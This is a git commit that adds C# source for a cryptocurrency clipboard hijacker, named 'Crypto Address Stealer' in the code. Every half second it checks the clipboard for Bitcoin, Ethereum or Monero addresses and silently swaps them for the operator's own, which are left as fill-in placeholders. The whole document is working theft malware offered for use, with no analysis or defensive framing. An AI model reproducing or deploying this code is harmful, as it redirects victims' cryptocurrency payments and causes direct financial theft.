f5d20ea4ee7cb10d81a0a51092e6c2f660f11c72
Mody <Mody@DESKTOP>
2024-09-27 16:30:32 +0300

    Add project files.

---
+++ Address.cs
@@ -0,0 +1,57 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Security;
+using System.Text;
+using System.Threading.Tasks;
+using System.Text.RegularExpressions;
+using System.Reflection.Metadata.Ecma335;
+using static System.Net.Mime.MediaTypeNames;
+
+namespace Crypto_Address_Clipper
+{
+    class Address
+    {
+        public enum CryptoTypes { BTC, ETH, XMR, NONE}
+        
+        public static CryptoTypes ValidateCryptoType(string address)
+        {
+            if (BtcMatch(address))
+            {
+                return CryptoTypes.BTC;
+            }
+            else if (EthMatch(address))
+            {
+                return CryptoTypes.ETH;
+            }
+            else if (XmrMatch(address))
+            {
+                return CryptoTypes.XMR;
+            }
+            else
+            {
+                return CryptoTypes.NONE;
+            }
+        }
+
+        public static bool XmrMatch(string address) => Regex.IsMatch(address, Regexes.Xmr);
+        public static bool EthMatch(string address) => Regex.IsMatch(address, Regexes.Eth);
+        public static bool BtcMatch(string address)
+        {
+            if (address.Length >= 26 && address.Length <= 62 && (address.StartsWith("1") || address.StartsWith("3") || address.StartsWith("bc1")))
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        class Regexes
+        {
+            public static string Eth = "^0x[a-fA-F0-9]{40}$";
+            public static string Xmr = "4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$";
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,94 @@
+﻿using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+using System.Text;
+
+namespace Crypto_Address_Clipper
+{
+    internal class Program
+    {
+
+        static void Main(string[] args)
+        {
+            Console.Title = "Crypto Address Stealer";
+            //Windows Clipboard cannot be accessed except in a STA thread
+            Thread thread1 = new Thread(Stealer);
+            thread1.SetApartmentState(ApartmentState.STA);
+            thread1.Start();
+
+
+            Console.ReadLine();
+
+        }
+
+        [STAThread]
+        public static void Stealer()
+        {
+            while (true)
+            {
+                //Uses custom method because Clipboard.GetText() Needs administration permissions
+                string clipboard = GetClipboard();
+                if (clipboard != string.Empty && clipboard!= "0x404")
+                {
+                    Address.CryptoTypes cryptoType;
+                    cryptoType = Address.ValidateCryptoType(clipboard);
+
+                    switch (cryptoType)
+                    {
+                        case Address.CryptoTypes.BTC:
+                            Console.WriteLine($"Changed: {clipboard} To: {YourAddresses.YourBtcAddressHere}");
+                            Clipboard.SetText(YourAddresses.YourBtcAddressHere);
+                            break;
+                        case Address.CryptoTypes.ETH:
+                            Console.WriteLine($"Changed: {clipboard} To: {YourAddresses.YourEthAddressHere}");
+                            Clipboard.SetText(YourAddresses.YourEthAddressHere);
+                            break;
+                        case Address.CryptoTypes.XMR:
+                            Console.WriteLine($"Changed: {clipboard} To: {YourAddresses.YourXmrAddressHere}");
+                            Clipboard.SetText(YourAddresses.YourXmrAddressHere);
+                            break;
+                        case Address.CryptoTypes.NONE:
+                            break;
+
+                    }
+                }
+                Thread.Sleep(500);
+            }
+        }
+
+        //Uses this method because Clipboard.GetText() Needs administration permissions
+        private static string GetClipboard()
+        {
+            IDataObject iData = Clipboard.GetDataObject();
+            // Is Data Text?  
+            if (iData.GetDataPresent(DataFormats.Text))
+            {
+                int failcounter = 0;
+                while (true)
+                {
+                    try
+                    {
+                        string capturedText = iData.GetData(DataFormats.UnicodeText).ToString();
+                        return capturedText;
+                    }
+                    catch (NullReferenceException)
+                    {
+                        failcounter++;
+                        continue;
+                    }
+                }
+            }
+
+            else
+            {
+                return "0x404";
+            }
+        }
+        private class YourAddresses
+        {
+            public static string YourBtcAddressHere = "PutYourBtcAddressHere";
+            public static string YourXmrAddressHere = "PutYourXmrAddressHere";
+            public static string YourEthAddressHere = "PutYourEthAddressHere";
+
+        }
+    }
+}
